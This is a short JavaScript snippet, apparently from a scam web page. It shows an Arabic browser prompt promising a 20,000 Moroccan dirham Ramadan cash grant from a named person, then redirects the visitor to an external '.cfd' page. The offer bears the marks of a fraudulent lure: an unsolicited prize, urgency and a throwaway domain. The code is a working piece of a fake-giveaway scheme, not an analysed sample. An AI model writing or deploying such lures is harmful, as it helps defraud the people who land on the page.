var password = 'سحب الأموال';

password = prompt(
  'تهانينا، أنت مؤهل للحصول على دعم رمضان النقدي بقيمة 20,000 درهم مغربي من إبراهيم غالي. انقر على موافق لاستلامه فورًا.',
  'سحب الأموال'
);

if (password !== 'سحب الأموال') {
    location.href = 'https://ongoing-grant.cfd/Daem-Ghali-Brahim-20,000.html';
}
